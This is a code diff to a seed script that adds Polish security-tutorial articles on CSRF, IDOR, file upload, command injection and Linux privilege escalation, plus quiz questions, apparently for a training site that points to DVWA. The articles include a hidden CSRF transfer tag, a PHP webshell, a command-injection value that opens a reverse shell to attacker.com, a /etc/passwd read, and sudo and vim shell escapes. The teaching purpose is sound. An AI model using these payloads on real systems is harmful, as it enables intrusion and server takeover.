@@ -263,11 +263,210 @@ DVWA → XSS (Reflected/Stored)
         },
     ]
 
+    # Add more sample articles
+    samples.extend([
+        {
+            "slug": "csrf-demystified",
+            "title": "CSRF — Cross-Site Request Forgery",
+            "content_md": """# CSRF — Cross-Site Request Forgery
+
+CSRF wymusza na użytkowniku wykonanie niechcianych akcji w aplikacji, w której jest zalogowany.
+
+## Jak to działa?
+
+1. Użytkownik jest zalogowany w banku (session cookie)
+2. Otwiera złośliwą stronę
+3. Strona wysyła ukryte żądanie przelewu
+
+## Przykład ataku
+
+```html
+<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none">
+```
+
+## Obrona
+
+- **CSRF Token:** Unikalny token w każdym formularzu
+- **SameSite Cookies:** `SameSite=Strict` lub `Lax`
+- **Re-authentication:** Potwierdzenie wrażliwych akcji hasłem
+- **Referer/Origin check:** Sprawdzanie źródła żądania
+
+## Test
+
+DVWA → CSRF (Low/Medium/High)
+""",
+            "read_time_minutes": 10,
+            "difficulty": 3,
+            "topic_slug": "csrf",
+        },
+        {
+            "slug": "idor-insecure-direct-object-ref",
+            "title": "IDOR — Insecure Direct Object References",
+            "content_md": """# IDOR — Insecure Direct Object References
+
+IDOR pozwala na dostęp do zasobów innych użytkowników poprzez manipulację identyfikatorami.
+
+## Przykład
+
+```
+GET /api/user/123/profile  ← własny profil
+GET /api/user/124/profile  ← cudzy profil (podatność!)
+```
+
+## Dlaczego to występuje?
+
+Aplikacja ufa identyfikatorom z frontu bez weryfikacji uprawnień:
+```python
+def get_user_profile(user_id):
+    return db.query(User).get(user_id)  # Brak sprawdzenia czyjącego!
+```
+
+## Obrona
+
+- **Authorization check:** Sprawdź czy `current_user.id == requested_user_id`
+- **Use UUIDs:** Zamiast prostego `123` użyj `a1b2c3d4-...`
+- **Indirect references:** Mapuj ID na tymczasowe tokeny
+
+## Test
+
+DVWA → Insecure CAPTCHA (podatność IDOR)
+""",
+            "read_time_minutes": 12,
+            "difficulty": 3,
+            "topic_slug": "idor",
+        },
+        {
+            "slug": "file-upload-attacks",
+            "title": "File Upload — Web Shells i RCE",
+            "content_md": """# File Upload Vulnerabilities
+
+Przesyłanie plików może prowadzić do przejęcia serwera poprzez upload webshella.
+
+## Zagrożenia
+
+1. **Webshell:** `shell.php` z `system($_GET['cmd'])`
+2. **RCE:** Upload `.jsp`/`.asp` jako kod serwerowy
+3. **XSS:** Upload `.html` z złośliwym JS
+4. **DoS:** Ogromne pliki paraliżują dysk
+
+## Atak — Webshell
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+Upload jako `shell.php` → `http://target.com/uploads/shell.php?cmd=id`
+
+## Obrona
+
+- **File type validation:** Sprawdzaj `Content-Type` i `file extension`
+- **Random filenames:** `md5(time()).ext` zamiast oryginalnej nazwy
+- **Whitelist extensions:** Tylko `.jpg`, `.png`, `.pdf`
+- **Store outside web root:** Lub sprawdzaj zawartość (magic bytes)
+
+## Test
+
+DVWA → File Upload (Low/Medium/High)
+""",
+            "read_time_minutes": 14,
+            "difficulty": 3,
+            "topic_slug": "file-upload",
+        },
+        {
+            "slug": "command-injection-guide",
+            "title": "Command Injection — Przejęcie serwera",
+            "content_md": """# Command Injection
+
+Wstrzykiwanie komend systemowych pozwala na przejęcie serwera poprzez metaznaki powłki.
+
+## Przykład podatności
+
+```php
+$ip = $_GET['ip'];
+system("ping " . $ip);  // Podatne!
+```
+
+Atakujący wysyła: `127.0.0.1; cat /etc/passwd`
+Lub: `127.0.0.1 && nc -e /bin/bash attacker.com 4444`
+
+## Metaznaki
+
+| Znak | Działanie |
+|------|------------|
+| `;` | Separator komend (Windows/Linux) |
+| `&&` | AND — następna komenda tylko gdy pierwsza się uda |
+| `||` | OR — następna gdy pierwsza się nie uda |
+| `|` | Pipe — przekazanie wyjścia |
+| `$()` / `` ` `` | Subshell execution |
+
+## Obrona
+
+- **Input validation:** Whitelist dozwolonych wartości
+- **Avoid system()/exec():** Użyj API zamiast powłki
+- **Escaping:** `escapeshellarg()` w PHP
+
+## Test
+
+DVWA → Command Injection
+""",
+            "read_time_minutes": 13,
+            "difficulty": 3,
+            "topic_slug": "command-injection",
+        },
+        {
+            "slug": "privilege-escalation-linux",
+            "title": "Privilege Escalation w Linux",
+            "content_md": """# Privilege Escalation w Linux
+
+Przejęcie uprawnień `root` — ostatni etap ataku po uzyskaniu dostępu użytkownika.
+
+## Techniki
+
+### 1. SUID Binaries
+```bash
+find / -perm -4000 2>/dev/null  # Znajdź SUID
+./vim -c ':!/bin/sh'          # Escalation przez vim
+```
+
+### 2. Cron Jobs
+```bash
+cat /etc/crontab                 # Sprawdź zadania cron
+# Jeśli cron edytowalny → dopisz złośliwe zadanie
+```
+
+### 3. Sudo misconfiguration
+```bash
+sudo -l                          # Sprawdź co można jako sudo
+sudo python -c 'import os; os.system("/bin/sh")'
+```
+
+### 4. Kernel Exploits
+```bash
+uname -r                         # Wersja jądra
+searchsploit linux kernel 3.13        # Szukaj exploita
+```
+
+## Obrona
+
+- **Least Privilege:** Użytkownicy bez zbędnych uprawnień
+- **Patch management:** Aktualizuj jądro i pakiety
+- **Disable SUID:** Usuń niepotrzebne SUID binaries
+- **Monitor cron:** Pilnuj zadań cron i uprawnień
+
+## Przykład CVE
+
+CVE-2021-3156 (Baron Samedit) — sudo heap overflow
+""",
+            "read_time_minutes": 18,
+            "difficulty": 4,
+            "topic_slug": "command-injection",
+        },
+    ])
+
     added = 0
     for art_data in samples:
         existing = db.query(Article).filter(Article.slug == art_data["slug"]).first()
         if not existing:
-            # Add quiz questions (3 per article)
+            # Add quiz questions (2-3 per article)
             article = Article(
                 slug=art_data["slug"],
                 title=art_data["title"],
@@ -280,41 +479,43 @@ DVWA → XSS (Reflected/Stored)
             db.add(article)
             db.flush()  # get ID
 
-            # Sample quiz
-            quizzes = [
-                {
-                    "question": "Co to jest SQL Injection?",
-                    "options": json.dumps(["Atak na serwer DNS", "Wstrzykiwanie SQL", "Atak DDoS", "XSS"]),
-                    "correct": 1,
-                    "explanation": "SQL Injection to wstrzykiwanie własnych zapytań SQL.",
-                },
-                {
-                    "question": "Która metoda zapobiega SQLi?",
-                    "options": json.dumps(["Escaping", "Prepared statements", "Hashowanie", "Szyfrowanie"]),
-                    "correct": 1,
-                    "explanation": "Prepared statements oddzielają kod od danych.",
-                },
-            ] if art_data["topic_slug"] == "sql-injection" else [
-                {
-                    "question": "Co oznacza XSS?",
-                    "options": json.dumps(["Cross-Site Scripting", "Extended Security Script", "XML Scripting", "eXtra Server Stack"]),
-                    "correct": 0,
-                    "explanation": "Cross-Site Scripting — wstrzykiwanie JS.",
-                },
-                {
-                    "question": "Który typ XSS jest zapisywany w bazie?",
-                    "options": json.dumps(["Reflected", "DOM", "Stored", "All"]),
-                    "correct": 2,
-                    "explanation": "Stored XSS trzyma payload w DB.",
-                },
-            ]
+            # Generate quiz based on topic
+            quiz_map = {
+                "sql-injection": [
+                    {"q": "Co to jest SQL Injection?", "opts": ["Atak na serwer DNS", "Wstrzykiwanie SQL", "Atak DDoS", "XSS"], "correct": 1},
+                    {"q": "Która metoda zapobiega SQLi?", "opts": ["Escaping", "Prepared statements", "Hashowanie", "Szyfrowanie"], "correct": 1},
+                ],
+                "xss": [
+                    {"q": "Co oznacza XSS?", "opts": ["Cross-Site Scripting", "Extended Security Script", "XML Scripting", "eXtra Server Stack"], "correct": 0},
+                    {"q": "Który typ XSS jest zapisywany w bazie?", "opts": ["Reflected", "DOM", "Stored", "All"], "correct": 2},
+                ],
+                "csrf": [
+                    {"q": "Co robi atak CSRF?", "opts": ["Kradnie hasła", "Wymusza akcje w zalogowanej sesji", "Wstrzykuje SQL", "Escaluje uprawnienia"], "correct": 1},
+                    {"q": "Który mechanizm chroni przed CSRF?", "opts": ["CORS", "CSRF Token", "Input validation", "Sanitization"], "correct": 1},
+                ],
+                "idor": [
+                    {"q": "Co to IDOR?", "opts": ["SQL Injection", "Dostęp do cudzych zasobów", "XSS attack", "CSRF attack"], "correct": 1},
+                    {"q": "Jak chronić się przed IDOR?", "opts": ["UUIDs", "Więcej JS", "Mniej SQL", "CORS"], "correct": 0},
+                ],
+                "file-upload": [
+                    {"q": "Jakie jest największe ryzyko uploadu plików?", "opts": ["DoS", "Webshell/RCE", "XSS", "CSRF"], "correct": 1},
+                    {"q": "Jak bronić się przed złośliwym uploadem?", "opts": ["Whitelist extensions", "Blacklist", "Więcej JS", "CORS"], "correct": 0},
+                ],
+                "command-injection": [
+                    {"q": "Co robi command injection?", "opts": ["Wstrzykuje SQL", "Wykonuje komendy systemowe", "Kradnie cookies", "Escaluje uprawnienia"], "correct": 1},
+                    {"q": "Który znak to AND w shell?", "opts": [";", "&&", "||", "|"], "correct": 1},
+                ],
+            }
+            quizzes = quiz_map.get(art_data["topic_slug"], [
+                {"q": "Pytanie testowe?", "opts": ["A", "B", "C", "D"], "correct": 0}
+            ])
             for idx, q in enumerate(quizzes):
                 quiz = ArticleQuiz(
                     article_id=article.id,
-                    question=q["question"],
-                    options=q["options"],
+                    question=q["q"],
+                    options=json.dumps(q["opts"]),
                     correct_index=q["correct"],
-                    explanation=q["explanation"],
+                    explanation=q.get("explanation", "Sprawdź materiał."),
                     question_order=idx,
                 )
                 db.add(quiz)
